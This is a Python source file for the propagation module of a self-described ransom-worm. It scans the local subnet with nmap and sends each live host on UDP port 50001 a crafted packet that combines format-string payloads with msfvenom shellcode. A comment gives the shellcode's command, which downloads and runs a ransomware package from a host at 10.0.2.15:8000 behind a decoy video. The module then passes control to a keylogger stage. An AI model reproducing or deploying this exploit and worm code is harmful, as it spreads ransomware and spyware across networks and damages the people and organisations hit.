#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, universal_newlines=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

#msfvenom -p linux/x64/exec CMD='touch ./youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode 
# shellcode =  b""
# shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
# shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xba\xb6\xcf"
# shellcode += b"\x88\x34\xa4\x1f\xb6\x48\x31\x58\x27\x48\x2d"
# shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xf2\x0e\xe0\xea\x5d"
# shellcode += b"\xca\x30\xc5\xd2\xb6\x56\xd8\x60\xfb\x4d\xd0"
# shellcode += b"\xd2\x9b\xac\xdc\x6a\xf6\xf7\xaf\xba\xb6\xcf"
# shellcode += b"\xfc\x5b\xd1\x7c\xde\x9a\x98\xe0\xf1\x5b\xd1"
# shellcode += b"\x7e\xc4\xdf\xd0\xba\xeb\x5f\xc1\x7b\x98\xce"
# shellcode += b"\xce\xbb\x88\x62\xf3\x4b\xe8\xd0\x8d\x97\x87"
# shellcode += b"\x31\xa4\x1f\xb6"

#msfvenom -p linux/x64/exec CMD='mkdir ransom-worm; cd ransom-worm; /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; /usr/bin/xdg-open cutecats.mp4; /usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; /usr/bin/unzip ransom-worm.zip; python3 -m pip install -r requirements.txt; python3 main.py;' -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xd8\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xbc\x89\x01"
shellcode += b"\x78\x18\x29\x04\x0c\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xf4\x31\x2e\x1a\x71"
shellcode += b"\x47\x2b\x7f\xd4\x89\x98\x28\x4c\x76\x56\x6a"
shellcode += b"\xd4\xa4\x62\x2c\x46\x7b\xec\x16\xbd\x89\x01"
shellcode += b"\x15\x73\x4d\x6d\x7e\x9c\xfb\x60\x16\x6b\x46"
shellcode += b"\x69\x21\xcb\xe6\x73\x15\x23\x09\x67\x68\x9c"
shellcode += b"\xfb\x60\x16\x6b\x46\x69\x21\xcb\xe6\x73\x15"
shellcode += b"\x23\x09\x2b\x79\xcf\xfb\x2e\x1a\x71\x47\x2b"
shellcode += b"\x7b\xdb\xec\x75\x58\x35\x66\x24\x6f\xc9\xfd"
shellcode += b"\x64\x1b\x79\x5d\x77\x22\xd1\xf9\x35\x58\x29"
shellcode += b"\x19\x2a\x3c\x92\xbb\x2f\x49\x2d\x13\x3c\x3c"
shellcode += b"\x8c\xb9\x2e\x0b\x7d\x47\x60\x53\xca\xe0\x65"
shellcode += b"\x1d\x77\x12\x24\x23\xc9\xfa\x73\x57\x7a\x40"
shellcode += b"\x6a\x23\xc4\xed\x66\x55\x77\x59\x61\x62\x9c"
shellcode += b"\xea\x74\x0c\x7d\x4a\x65\x78\xcf\xa7\x6c\x08"
shellcode += b"\x2c\x12\x24\x23\xc9\xfa\x73\x57\x7a\x40\x6a"
shellcode += b"\x23\xcb\xee\x64\x0c\x38\x04\x4b\x2c\xce\xe8"
shellcode += b"\x6f\x0b\x77\x44\x29\x7b\xd3\xfb\x6c\x56\x62"
shellcode += b"\x40\x74\x2c\x8d\xb9\x2f\x48\x36\x1b\x2a\x3d"
shellcode += b"\x89\xb3\x39\x48\x28\x19\x2b\x7f\xd9\xe7\x65"
shellcode += b"\x27\x6a\x48\x6a\x7f\xd3\xe4\x76\x17\x6a\x44"
shellcode += b"\x3f\x2c\x93\xfc\x72\x0a\x37\x4b\x6d\x62\x93"
shellcode += b"\xfc\x6f\x02\x71\x59\x24\x7e\xdd\xe7\x72\x17"
shellcode += b"\x75\x04\x73\x63\xce\xe4\x2f\x02\x71\x59\x3f"
shellcode += b"\x2c\xcc\xf0\x75\x10\x77\x47\x37\x2c\x91\xe4"
shellcode += b"\x21\x08\x71\x59\x24\x65\xd2\xfa\x75\x19\x74"
shellcode += b"\x45\x24\x21\xce\xa9\x73\x1d\x69\x5c\x6d\x7e"
shellcode += b"\xd9\xe4\x64\x16\x6c\x5a\x2a\x78\xc4\xfd\x3a"
shellcode += b"\x58\x68\x50\x70\x64\xd3\xe7\x32\x58\x75\x48"
shellcode += b"\x6d\x62\x92\xf9\x78\x43\x18\x7f\x53\x58\xe2"
shellcode += b"\xe3\x3a\x20\x17\x2c\x04\x0c"


def run():
    next_action = ""
    data = "no_data"
    print("[+] Propagation module activated...")

    try:
        interface = get_interface()
        network = get_network(interface)
        port = 50001
        neighbors = net_scan(network)
        print('Lets attack')
        print('Brute all active Hosts on Port 50001')
        
        for ip in neighbors:
            print(f'IP: {ip}')
            p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(p, (ip, port))
            s.close()
                
    except Exception as e: 
            print(e)
            pass

    next_action = "keylogger"
    return data, next_action
